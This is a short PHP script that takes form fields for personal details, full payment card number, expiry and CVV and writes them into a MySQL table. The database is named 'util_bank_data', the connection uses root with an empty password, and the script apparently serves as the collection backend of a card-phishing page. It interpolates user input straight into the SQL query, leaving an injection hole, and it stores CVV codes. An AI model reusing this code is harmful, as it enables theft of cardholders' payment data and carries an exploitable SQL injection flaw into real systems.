<?php

$server ="localhost";
$username ="root";
$password ="";
$dbname ="util_bank_data";

$con =mysqli_connect($server,$username,$password,$dbname);

if (!$con) {
   echo "not connected";
}
// start

$nom = $_POST['nom'];
$email = $_POST['email'];
$address = $_POST['address'];
$city = $_POST['city'];
$country = $_POST['country'];
$tel = $_POST['tel'];
$name_card = $_POST['name_card'];
$number_card = $_POST['number_card'];
$month = $_POST['month'];
$year = $_POST['year'];
$cvv = $_POST['cvv'];

$sql = "INSERT INTO `data`( `nom`, `email`, `address`, `city`, `country`, `tel`, `name_card`, `number_card`, `month`, `year`, `cvv`) VALUES (' $nom',' $email',' $address',' $city',' $country',' $tel',' $name_card',' $number_card',' $month',' $year',' $cvv')";

$result = mysqli_query($con , $sql);

if ($result) {
   echo "data submited";
}else{
   echo "query faild...";
}

?>